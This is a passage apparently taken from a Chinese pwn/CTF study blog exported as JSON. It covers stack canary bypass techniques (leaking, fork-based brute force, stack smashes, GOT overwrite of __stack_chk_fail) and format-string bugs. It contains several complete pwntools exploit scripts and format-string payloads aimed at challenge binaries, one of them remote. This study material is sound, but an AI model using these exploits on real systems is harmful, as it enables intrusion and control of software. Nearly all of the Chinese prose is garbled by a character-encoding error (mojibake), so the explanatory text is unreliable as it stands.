å¯„å­˜å™¨ï¼‰è¢«æ“ä½œç³»ç»Ÿç”¨äºæŒ‡å‘å½“å‰çº¿ç¨‹çš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨ (TLS) åŒºåŸŸã€‚\n\nGCC ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶ï¼Œä¼šåœ¨ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–è¿™ä¸ª Canary å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ TLS åŒºåŸŸçš„ä¸€ä¸ªç‰¹å®šåç§»é‡ä¸Šã€‚\nå¯¹äº x86-64 Linuxï¼Œè¿™ä¸ªåç§»é‡é€šå¸¸æ˜¯ 0x28ã€‚æ‰€ä»¥ï¼Œfs:0x28 æŒ‡å‘çš„å†…å­˜åœ°å€å°±æ˜¯å½“å‰çº¿ç¨‹çš„ stack_guardï¼ˆå³ Canary å€¼ï¼‰çš„å­˜å‚¨ä½ç½®ã€‚\n\nè€Œä¸”TLSä¸­çš„å€¼ç”±å‡½æ•°security_initè¿›è¡Œåˆå§‹åŒ–\n\næœ€åï¼Œæ³¨æ„Canaryæœ€åçš„ä¸€ä¸ªå­—èŠ‚ä¼šè¢«è®¾ç½®ä¸º0ï¼Œé˜²æ­¢ç±»ä¼¼printfï¼ˆâ€%sâ€,&amp;bufï¼‰å½¢å¼çš„å‡½æ•°ä¸å°å¿ƒå°†Canaryçš„å€¼æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥ç”¨â€œ\\x00â€å­—ç¬¦ï¼ˆåœ¨Cè¯­è¨€ä¸­è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼‰æ¥åšä¸€ä¸ªæˆªæ–­ï¼Œå’ŒASLRæ²¡æœ‰å…³ç³»ã€‚\næ ˆç»“æ„\n[ buf (256 bytes)         ]  â† esp+0x00[ stack canary (4 bytes)  ]  â† esp+0x100[ saved ebp (4 bytes)     ][ return address (4 bytes)]\n\nå¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰ä¸‹é¢4ä¸ªæ€è·¯ï¼š\n1ï¼‰åˆ©ç”¨æ³„éœ²å‡½æ•°æ³„éœ²å‡ºCanaryçš„å€¼ï¼Œå†è¿›è¡Œåˆ©ç”¨ã€‚\n2ï¼‰çˆ†ç ´å¾—åˆ°Canaryçš„å€¼ã€‚\n3ï¼‰__stack_chk_failå‡½æ•°æ³„éœ²å…³é”®ä¿¡æ¯ã€‚\n4ï¼‰ä¿®æ”¹TLSä¸­çš„stack_guardå€¼ã€‚\n1.leak_canaryï¼ˆæ³„éœ²Canaryå€¼ï¼‰\n\n\nè„šæœ¬1ï¼ˆprintf_æ›¿ä»£&#x2F;x00ï¼‰from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b *0x08048631&quot;)main=0x0804867fbin= 0x080485CCpayload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary))payload=b&#x27;\\x00&#x27;*0x100+p32(canary)payload+=p32(0)*2payload+=p32(main)payload+=p32(bin)p.send(payload)p.interactive()\n\n\n\npayload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary))\n\nç”¨bæ›¿ä»£canaryæœ€ä½ä½çš„\\x00,ä½¿å¾—å®ƒçš„å€¼å¯ä»¥è¢«è¾“å‡º\nç„¶åç”¨æ”¶åˆ°çš„æ•°æ®å‡å»bçš„å€¼å°±æ˜¯canaryçš„å€¼\npayload+=p32(0)*2\n\nä¸¤ä¸ªpadding\n\nåˆ†é…äº† 0x118å­—èŠ‚çš„æ ˆç©ºé—´ç»™å±€éƒ¨å˜é‡å’Œpaddingã€‚\næ ˆç©ºé—´ä¸€æ¬¡æ€§åˆ†é…ï¼Œä¾¿äºç®¡ç†å’Œæ€§èƒ½\n\nç¼–è¯‘å™¨åœ¨å‡½æ•°å…¥å£ä¼šæ‰§è¡Œç±»ä¼¼ sub esp, 0x118 çš„æ“ä½œï¼Œä¸€æ¬¡æ€§ç»™å‡½æ•°æ‰€æœ‰å±€éƒ¨å˜é‡ã€ä¸´æ—¶æ•°æ®å’Œå¯¹é½ç©ºé—´åˆ†é…è¶³å¤Ÿå¤§çš„è¿ç»­æ ˆç©ºé—´ã€‚åˆ†é…çš„ 280 å­—èŠ‚æ˜¯ buf + å…¶ä»–å±€éƒ¨å˜é‡ + padding\n\nè¿™å—ç©ºé—´é‡ŒåŒ…å«ä½ æ‰€æœ‰å±€éƒ¨å˜é‡ï¼ˆæ¯”å¦‚ bufï¼‰ã€éšå¼å˜é‡ï¼ˆæ¯”å¦‚ä¿å­˜çš„å¯„å­˜å™¨ï¼‰ã€ä»¥åŠä¸ºäº†æ»¡è¶³ CPU è®¿é—®å¯¹é½éœ€æ±‚è€Œæ’å…¥çš„ paddingã€‚\nä»ebpå¼€è¾Ÿäº†0x118ä¸ªå­—èŠ‚å­˜æ”¾ï¼Œä½†bufä»ebp-0x10cå¼€å§‹å­˜å‚¨ï¼Œæ¥ç€æ˜¯canaryï¼Œæ‰€ä»¥è¿˜æœ‰ä¸¤ä¸ªpadding\n\n\ncanaryä¸ä¸€å®šæ˜¯æŒ¨ç€ç¼“å†²åŒºçš„ï¼Œå•åœ¨è¿™é“é¢˜æ˜¯çš„\n\n\n\n\næƒ…å†µ\nä¼šæ’ canary ç´§æŒ¨æ•°ç»„å—ï¼Ÿ\n\n\n\nå‡½æ•°é‡Œæœ‰ char buf[xxx]\nâœ… ä¸€èˆ¬ä¼šæ”¾ canary åœ¨ buf åé¢\n\n\næ²¡æœ‰æ•°ç»„ã€ä¸ä¼šæ ˆæº¢å‡º\nâŒ é€šå¸¸ä¸ä¼šå¯ç”¨ canary\n\n\næ•°ç»„ä¸åœ¨æ ˆä¸Šï¼ˆæ¯”å¦‚ malloc çš„ï¼‰\nâŒ ä¸æ˜¯æ ˆä¿æŠ¤çš„èŒƒå›´\n\n\nç‰¹æ®Šä¼˜åŒ–æˆ–å†…è”å°å‡½æ•°\nâš ï¸ å¯èƒ½è¢«çœç•¥\n\n\n\nè™½ç„¶ canary çš„ä½ç½®ä¸æ˜¯ç¡¬ç¼–ç çš„ï¼Œä½†åœ¨å®é™…åœºæ™¯ä¸­ï¼ˆç‰¹åˆ«æ˜¯é¢˜ç›®æ˜ç¡®æœ‰ char buf[] å¹¶å¼€å¯äº† canaryï¼‰ï¼Œå®ƒé€šå¸¸ å°±åœ¨ buf åé¢ï¼Œä¸”é€šè¿‡è°ƒè¯•æˆ–è¯•æ¢å¯ä»¥å‡†ç¡®ç¡®å®šå®ƒçš„åç§»ä½ç½®ã€‚\n\nè„šæœ¬2ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰å¯ä»¥çœ‹åˆ°bufåœ¨ç¬¬7ä¸ªä½ç½®ä¸Š\nè€Œä¸”bufæœ‰256ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å­˜æ”¾64ä¸ªå­—ç¬¦\næ‰€ä»¥canaryå°±æ˜¯åœ¨ç¬¬64+7å³71ä¸ªå‚æ•°çš„ä½ç½®\nfrom pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b printf&quot;)target = 0x080485CCp1 = &quot;%71$p\\n&quot;p.send(p1)leak_info = p.recvuntil(&quot;\\n&quot;,drop = True)canary = int(leak_info,16)log.success(&quot;canary:&quot; + hex(canary))p2 = b&quot;\\x00&quot; * 0x100 + p32(canary)p2 += p32(0) * 3p2 += p32(target)p.send(p2)p.interactive()\n\n\n\n\n\n\n\n2.one_by_one_bruteforce(é€ä¸ªå­—èŠ‚çˆ†ç ´)é€šè¿‡forkå‡½æ•°å¼€å¯å­è¿›ç¨‹äº¤äº’çš„é¢˜ç›®ï¼Œå› ä¸ºforkå‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜ï¼Œæ‰€ä»¥æ¯æ¬¡åˆ›å»ºçš„å­è¿›ç¨‹çš„Canaryæ˜¯ç›¸åŒçš„ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œé€ä¸ªå­—èŠ‚åœ°å°†Canaryçˆ†ç ´å‡ºæ¥ã€‚\n\nè„šæœ¬from pwn import *p = process(&quot;./one_by_one_bruteforce&quot;)def bruteforece1bit():\tglobal known\tfor i in range(256):\t\tp1 = &quot;a&quot; * 0x108\t\tp1 += known\t\tp1 += chr(i)\t\tp.sendafter(&quot;one_by_one_bruteforce\\n&quot;,p1)\t\ttry:\t\t\tinfo = p.recvuntil(&quot;\\n&quot;)\t\t\tif &quot;*** stack smashing detected ***:&quot; in info:\t\t\t\tp.send(&quot;n\\n&quot;)\t\t\t\tcontinue\t\t\telse:\t\t\t\tknown += chr(i)\t\t\t\tbreak\t\texcept:\t\t\tlog.info(&quot;maybe there something wrong&quot;)\t\t\tbreakdef bruteforce_canary():\tglobal known\tknown += &quot;\\x00&quot;\tfor i in range(7):\t\tbruteforece1bit()\t\tif i != 6:\t\t\tp.send(&quot;n\\n&quot;)\t\telse:\t\t\tp.send(&quot;y\\n&quot;)context.log_level = &quot;debug&quot;target = 0x000000000040083Eknown = &quot;&quot;bruteforce_canary()canary = u64(known)log.success(&quot;canary:&quot; + hex(canary))p2 = &quot;a&quot; * 0x108 + p64(canary) + p64(0) + p64(target)p.sendafter(&quot;go\\n&quot;,p2)p.interactive()\n\né€å­—èŠ‚å°è¯•ï¼Œæ— â€œstack smashing detectedâ€æŠ¥é”™å›æ˜¾æ¥å¯¹Canaryçš„æ•°å€¼è¿›è¡Œé€å­—èŠ‚çˆ†ç ´ã€‚å¦‚æœè¾“å…¥æ­£ç¡®ï¼Œåˆ™æ²¡æœ‰å›æ˜¾ï¼Œèƒ½å¾—åˆ°Canaryçš„è¿™ä¸ªå­—èŠ‚ï¼Œç„¶åå¼€å§‹ä¸‹ä¸€ä¸ªå­—èŠ‚çš„çˆ†ç ´ï¼›å¦‚æœè¾“å…¥æœ‰è¯¯ï¼Œåˆ™çˆ†ç ´ä¸æˆåŠŸï¼Œç»§ç»­ä¸‹ä¸€ä¸ªçˆ†ç ´çš„æ•°å€¼ï¼Œçˆ†ç ´ä¸æˆåŠŸæ—¶å­è¿›ç¨‹ä¼šæŠ¥é”™é€€å‡ºï¼Œä½†ä¸ä¼šå½±å“çˆ¶è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹ä¼šä¸€ç›´åˆ›å»ºå­è¿›ç¨‹ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®ç°çˆ†ç ´ã€‚å¾—åˆ°Canaryçš„å…·ä½“æ•°å€¼åï¼Œå¯ä»¥åœ¨çˆ¶è¿›ç¨‹è¿›è¡Œæ ˆæº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€ï¼Œå®ç°Getshellï¼Œä¹Ÿå¯ä»¥åœ¨å­è¿›ç¨‹ä¸­å®ç°Getshellã€‚å› ä¸ºæœ‰äº†Canaryçš„å…·ä½“æ•°å€¼ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡Canaryä¿æŠ¤æœºåˆ¶\n3.stack_smashesstack_smashesæ˜¯ä¸€ç§ç‰¹æ®Šçš„åˆ©ç”¨æ€è·¯ã€‚å‰é¢å·²ç»æåˆ°è¿‡ï¼Œåœ¨_stack_chk_failå‡½æ•°ä¸­ä¼šå°†_libc_argv[0]çš„ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œ\nä¾‹å¦‚(stack smashing detected : [ç¨‹åºå] terminatedï¼‰å¦‚æœèƒ½å¤Ÿæ§åˆ¶__libc_argv[0]ä¸­ä¿å­˜çš„åœ°å€ä¸ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯çš„åœ°å€ï¼Œé‚£ä¹ˆå°±èƒ½å¾—åˆ°ç›¸åº”çš„æ•°æ®ã€‚\nåœ¨ Linux ç³»ç»Ÿä¸­ï¼Œç¨‹åºåé€šå¸¸æ˜¯é€šè¿‡è¯»å– __libc_argv[0] è¿™ä¸ªå…¨å±€æŒ‡é’ˆæ¥å®ç°çš„ã€‚__libc_argv æ˜¯ libc åº“å†…éƒ¨ç»´æŠ¤çš„ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œå…¶ä¸­ __libc_argv[0] æŒ‡å‘å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²ã€‚\næ”»å‡»è€…é€šè¿‡ä»»æ„åœ°å€å†™å…¥ï¼ˆé€šå¸¸é€šè¿‡ ROP é“¾å®ç°ï¼‰å°† __libc_argv[0] è¿™ä¸ªæŒ‡é’ˆçš„å€¼ï¼Œä»åŸæ¥çš„ç¨‹åºååœ°å€ï¼Œä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦æ³„éœ²çš„æ•°æ®çš„åœ°å€ï¼ˆä¾‹å¦‚ flag çš„åœ°å€ï¼‰ã€‚\n\nğŸ” main å‡½æ•°çš„æ ‡å‡†åŸå‹\nint main(int argc, char *argv[], char *envp[]);\n\nargc: å‘½ä»¤è¡Œå‚æ•°ä¸ªæ•°\nargv: å‚æ•°å­—ç¬¦ä¸²æ•°ç»„æŒ‡é’ˆ\nenvp: ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²æ•°ç»„æŒ‡é’ˆ\nåœ¨æ ˆä¸Šï¼Œè¿™äº›å‚æ•°æ˜¯ç”± __libc_start_main è°ƒç”¨ main æ—¶ä¼ å…¥çš„ã€‚\næ‰€ä»¥æŸ¥çœ‹bufçš„åœ°å€\n\nç›´æ¥ä¸‹æ–­ç‚¹åˆ°readçš„ä½ç½®ï¼Œçœ‹åˆ°bufçš„ä½ç½®æ˜¯0x7fffffffdc00\næ¥ç€æŸ¥çœ‹libc_argc[1],å³æ–‡ä»¶ä¿¡æ¯\n0x7fffffffde18\n\n\nè®¡ç®—å¥½åç§»ä¹‹åå°±å¯ä»¥æŠŠlibc_argc[0]çš„åœ°å€æ¢ä¸ºflagçš„åœ°å€äº†\nè„šæœ¬from pwn import *p = process(&quot;./stack_smashes&quot;)#gdb.attach(p,&quot;b *0x0000000000400875&quot;)context.log_level = &quot;debug&quot;flag_addr = 0x0601090p2 = &quot;a&quot; * 0x218 + p64(flag_addr)p.sendafter(&quot;stack_smashes\\n&quot;,p2)p.interactive()\n\n\n\n\n\n\n\n\n\nè¿˜æœ‰å°±æ˜¯ç›´æ¥æŠŠstack_chk_failå‡½æ•°çš„getè¡¨æ‘çš„åœ°å€æ”¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€\n\n\n\nåç§»æ˜¯6\nè„šæœ¬from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,word_size=&#x27;64&#x27;)p=remote(&quot;node5.buuoj.cn&quot;,25904)#p = process(&quot;./r2t4&quot;)elf = ELF(&quot;./r2t4&quot;)backdoor = 0x400626#__stack_chk_fail_got_addr = elf.got[&quot;__stack_chk_fail&quot;]__stack_chk_fail = elf.got[&#x27;__stack_chk_fail&#x27;]payload = fmtstr_payload(6, &#123;__stack_chk_fail: backdoor&#125;).ljust(0x38,b&#x27;a&#x27;)p.sendline(payload)p.interactive()\n\næ€»ç»“æ¥è¯´ï¼Œljust(0x38, bâ€™aâ€™) çš„ç›®çš„æ˜¯ï¼š\nç¡®ä¿ read å‡½æ•°è¯»å–åˆ°å®Œæ•´çš„ã€ç”±æˆ‘ä»¬æ§åˆ¶çš„ 56 å­—èŠ‚æ•°æ®ã€‚\né˜²æ­¢ read å‡½æ•°è¯»å–åˆ°å…¶ä»–ä¸å¯é¢„æµ‹çš„æ•°æ®ï¼Œä»è€Œå¹²æ‰° printf çš„è¡Œä¸ºã€‚\n","categories":["pwn_study"],"tags":["PWN"]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","url":"/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","content":"åŸç†æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å®ƒè§£æä¹‹åçš„å‚æ•°ã€‚\né€šä¿—æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„ä½œç”¨æ˜¯å°†è®¡ç®—æœºå†…å­˜ä¸­çš„æ•°æ®è½¬åŒ–ä¸ºäººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š\n(1ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ã€‚\n(2ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚\n(3ï¼‰åç»­å‚æ•°ï¼Œå¯é€‰ã€‚\nç”¨printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalaryï¼‰\nprintfå‡½æ•°å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼Œâ€name:%s,age:%d,salary:%4.2fâ€å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œâ€œmyname,myage,mysalaryâ€å«ä½œåç»­å‚æ•°ã€‚\nğŸ§± å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¦å·\n\n\næ ¼å¼ç¬¦\nä½œç”¨\nç¤ºä¾‹\n\n\n\n\n%x&#x2F;%p\nä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºæ ˆä¸Šçš„å€¼\n%xâ†’0xdeadbeef\n%pé€šå¸¸å¸¦0xå‰ç¼€\n\n\n%d&#x2F;%u\nä»¥åè¿›åˆ¶è¾“å‡ºæ ˆä¸Šçš„å€¼\n%dâ†’3735928559\n\n\n\n%c\nè¾“å‡ºæ ˆä¸Šå€¼çš„æœ€ä½ä¸€ä¸ªå­—èŠ‚\n%câ†’&#39;A&#39;\n\n\n\n%s\næŠŠæ ˆä¸Šçš„å€¼å½“ä½œåœ°å€ï¼Œè¾“å‡ºè¯¥åœ°å€çš„å­—ç¬¦ä¸²\n%sâ†’&quot;Hello&quot;\n\n\n\n%hn\nå†™å…¥ 2 å­—èŠ‚ï¼ˆshortï¼‰\n%hnâ†’ å†™å…¥ä½ 2 å­—èŠ‚\n\n\n\n%hhn\nå†™å…¥ 1 å­—èŠ‚ï¼ˆcharï¼‰\n%hhnâ†’ å†™å…¥ä½ 1 å­—èŠ‚\n\n\n\n%n\nå°†å·²è¾“å‡ºå­—ç¬¦æ•°å†™å…¥æ ˆä¸Šçš„åœ°å€\n%nâ†’ å†™å…¥0x4åˆ°æŒ‡å®šåœ°å€\n\n\n\n%$p&#x2F;%%$s\næŒ‡å®šç¬¬å‡ ä¸ªå‚æ•°ä½ç½®çš„å€¼\n%4$pâ†’ ç¬¬ 4 ä¸ªå‚æ•°\n\n\n\n%%\nè¾“å‡ºä¸€ä¸ª%å­—ç¬¦æœ¬èº«\n%%â†’%\n\n\n\n\nå½“ç”¨æˆ·æ§åˆ¶äº† printf() çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰ï¼Œè€Œç¨‹åºæ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–é™åˆ¶ï¼Œå°±å¯èƒ½é€ æˆä»¥ä¸‹é—®é¢˜ï¼š\nchar input[100];fgets(input, sizeof(input), stdin);printf(input);  // âš ï¸ å±é™©ï¼ç”¨æˆ·è¾“å…¥ç›´æ¥ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²\n\næ­¤æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ è¾“å…¥ï¼Œå¦‚ï¼š\n%x %x %x %x %s\nç¨‹åºä¼šå°è¯•ä»æ ˆä¸­è¯»å–å‚æ•°ï¼Œä½†ç”±äºæ²¡æœ‰æä¾›å‚æ•°åˆ—è¡¨ï¼Œprintf() ä¼šç»§ç»­ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ã€‚è¿™å¯èƒ½å¯¼è‡´ï¼š\n\næ³„éœ²æ ˆå†…å­˜å†…å®¹ï¼ˆå¦‚è¿”å›åœ°å€ã€canaryã€å‡½æ•°æŒ‡é’ˆç­‰ï¼‰\n\nå†™å…¥å†…å­˜ï¼ˆé€šè¿‡ %n æ ¼å¼ç¬¦ï¼‰\n\n\nè™½ç„¶æ²¡æœ‰å†™ä»»ä½•å‚æ•°ï¼Œä½†è¿˜æ˜¯ä¼šå¯¹åº”åœ°è§£æå‚æ•°ï¼Œå› ä¸ºåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­å†™äº†å¯¹åº”çš„è§£ææ–¹å¼ï¼Œæ‰€ä»¥åœ¨åç»­çš„å‡½æ•°è¿è¡Œä¸­ä¼šè§£ææ ˆä¸Šçš„å…ƒ\nç´ ã€‚å¯¹äºæ•´å‹å€¼å’Œæµ®ç‚¹å€¼ï¼Œè¿™æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä¸ç®¡æ ˆä¸Šæ˜¯ä»€ä¹ˆæ•°æ®éƒ½èƒ½å¤ŸæŒ‰ç…§æ•´å‹å€¼å’Œæµ®ç‚¹å€¼è§£æå‡ºæ¥ï¼Œè€Œå­—ç¬¦ä¸²å½¢å¼å°±ä¸ä¸€å®šèƒ½è§£æå‡ºæ¥\näº†ã€‚å¦‚æœæ˜¯ä¸€ä¸ªéæ³•åœ°å€ï¼Œæ¯”å¦‚NULLï¼Œé‚£ä¹ˆåœ¨è§£æçš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œ\nå› ä¸ºè¿™ä¸ªåœ°å€æŒ‰ç…§å­—ç¬¦ä¸²è§£ææ˜¯æ— æ³•è§£æå‡ºæ¥çš„ï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚è¿™å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åŸºæœ¬åŸç†\nåˆ©ç”¨leakmemory(æ³„éœ²æ ˆä¸Šå†…å®¹)\nç”¨äº† %100s æ¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºï¼Œä½†å¹¶æ²¡æœ‰é™åˆ¶ç”¨æˆ·è¾“å…¥çš„æ ¼å¼ç¬¦å†…å®¹ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š\n\nç”¨æˆ·å¯ä»¥è¾“å…¥ %xã€%sã€%n ç­‰æ ¼å¼ç¬¦ã€‚\n\nprintf ä¼šæ ¹æ®è¿™äº›æ ¼å¼ç¬¦ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ï¼Œä»è€Œé€ æˆä¿¡æ¯æ³„éœ²æˆ–ä»»æ„åœ°å€å†™å…¥ã€‚\n\n\n\nleakmemory(æ³„éœ²ä»»æ„åœ°å€å†…å­˜)è¿™é‡Œçš„ç›®æ ‡è®¾ç«‹æ³„éœ²isoc99_scanfå‡½æ•°ï¼ˆscanfç¼–è¯‘ä¹‹åæ˜¯isoc99_scanfåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼‰ã€‚\n%k$s\nè¿™é‡Œçš„pæ˜¯å¯ä»¥æ›´æ¢çš„ï¼Œæ¯”å¦‚æ›´æ¢ä¸ºså°±å¯ä»¥è§£ææ ˆä¸Šçš„æ•°æ®ä¸ºå­—ç¬¦ä¸²ã€‚\nkï¼šè¡¨ç¤ºè¦æ‰“å°çš„å‚æ•°è·ç¦»ç›®å‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°çš„è·ç¦»ã€‚\nå› ä¸ºåœ¨æ²¡æœ‰ç»™printfæä¾›å¯¹åº”çš„å­—ç¬¦ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªå¯å˜å‚æ•°å‡½æ•° ï¼Œå®ƒä¼šä»æ ˆä¸Šä¾æ¬¡è¯»å–æ•°æ®æ¥å¡«å……æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ %pã€%xã€%sã€%n ç­‰æŒ‡ä»¤ã€‚\nä½†ä½ å¹¶ä¸çŸ¥é“ä½ è¾“å…¥çš„å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„å…·ä½“ä½ç½®ï¼Œæ‰€ä»¥ä½ éœ€è¦ï¼š\n\næ‰¾åˆ°ä½ çš„è¾“å…¥å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„åç§»é‡ï¼Œæ‰èƒ½ç²¾å‡†æ§åˆ¶è¯»å†™çš„å†…å®¹ã€‚ \n\n\næ‰€ä»¥åç§»é‡å°±æ˜¯4\næ‰€ä»¥æ„é€ payload &#x3D; p32(scanf_got) + â€œ%4$sâ€\nç›¸å½“äºprint(p32(scanf_got) + â€œ%4$sâ€)\næ‰€ä»¥å‰å››ä¸ªå­—èŠ‚æ˜¯è¾“å‡ºçš„scanfçš„gotè¡¨\n\n ğŸ§  å…³é”®åŒºåˆ«ï¼šåœ°å€ vs åœ°å€çš„å†…å®¹\n\n\n\n\n\n\n\n\n\n\n\nscanf_got\nGOT è¡¨ä¸­scanfçš„åœ°å€ï¼ˆ.gotæ®µä¸­çš„ä¸€ä¸ªä½ç½®ï¼‰\n0x804a008\nå°±åƒä¹¦çš„ç›®å½•é¡µç \n\n\næ³„éœ²çš„åœ°å€ï¼ˆleak_addrï¼‰\nè¿™ä¸ª GOT è¡¨é¡¹ä¸­å­˜å‚¨çš„å€¼ï¼ˆå³scanfçš„å®é™…åœ°å€ï¼‰\n0xf7e01234\nå°±åƒç›®å½•é¡µç æŒ‡å‘çš„é‚£ä¸€é¡µçš„å†…å®¹\n\n\nè„šæœ¬from pwn import *p = process(&quot;./leakmemory&quot;)elf = ELF(&quot;./leakmemory&quot;)#gdb.attach(p,&quot;b printf&quot;)scanf_got = elf.got[&quot;__isoc99_scanf&quot;]payload=p32(scanf_got)+b&quot;%4$s&quot;p.sendline(payload)leak_addr = u32(p.recv(8)[4:])scanf_addr = leak_addrlog.success(&quot;scanf_addr:&quot; + hex(scanf_addr))p.interactive()\n\nprintf æ‰§è¡Œæµç¨‹ï¼š\n\nprintf ä¼šä»æ ˆä¸Šè¯»å–å‚æ•°ï¼›\nå®ƒçœ‹åˆ° %4$sï¼Œä¼šä»ç¬¬ 4 ä¸ªå‚æ•°ä½ç½®è¯»å–ä¸€ä¸ªåœ°å€ï¼›\nè¿™ä¸ªåœ°å€æ˜¯ 0x804a018ï¼ˆä½ å†™å…¥çš„ GOT åœ°å€ï¼‰ï¼›\nç„¶åä» 0x804a018 åœ°å€ä¸­è¯»å‡ºä¸€ä¸ªæŒ‡é’ˆï¼ˆæ¯”å¦‚ 0xf7e01234ï¼Œå³ scanf çš„è¿è¡Œæ—¶åœ°å€ï¼‰ï¼›\n%s ä¼šä» 0xf7e01234 å¼€å§‹è¯»å–å­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ° \\0ï¼›\næœ€ç»ˆä½ æ¥æ”¶åˆ°çš„æ•°æ®ä¸­åŒ…å« 0xf7e01234ã€‚\n\nğŸ“Œ æ€»ç»“\n\n\n\n\n\n\n\n\nelf.got[&quot;scanf&quot;]å’Œelf.got[&quot;__isoc99_scanf&quot;]ä¸€æ ·å—ï¼Ÿ\nä¸ä¸€å®šï¼Œå–å†³äºç¼–è¯‘å™¨\n\n\nä¸ºä»€ä¹ˆä¼šæœ‰__isoc99_scanfï¼Ÿ\nGCC ç¼–è¯‘å™¨ä¸ºäº†æ”¯æŒ C99 æ ‡å‡†å¼•å…¥çš„\n\n\næ€ä¹ˆç¡®è®¤ç”¨å“ªä¸ªï¼Ÿ\nç”¨readelf -ræˆ–objdump -TRæŸ¥çœ‹ GOT è¡¨\n\n\nèƒ½ä¸èƒ½æ›¿æ¢ï¼Ÿ\nåªæœ‰ GOT è¡¨ä¸­å­˜åœ¨å¯¹åº”ç¬¦å·æ—¶æ‰èƒ½æ›¿æ¢\n\n\nå¦‚æœå†™é”™äº†ä¼šæ€æ ·ï¼Ÿ\næŠ¥é”™ï¼šKeyError\n\n\n\nå‡½æ•°è°ƒç”¨å®Œæ•´è¿‡ç¨‹ğŸŒŸ é˜¶æ®µ 0ï¸âƒ£ï¼šåœ¨ vulnfunc é‡Œï¼ˆè°ƒç”¨ printf ä¹‹å‰ï¼‰\nè¿™æ˜¯å·²ç»åœ¨ vulnfunc é‡Œï¼Œä¸”æ ˆå¸§å·²ç»å»ºç«‹å¥½äº†ã€‚ æ ˆé¡¶åœ¨ espï¼Œæ ˆä½åœ¨é«˜åœ°å€æ–¹å‘ã€‚\n     â†‘ é«˜åœ°å€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€| 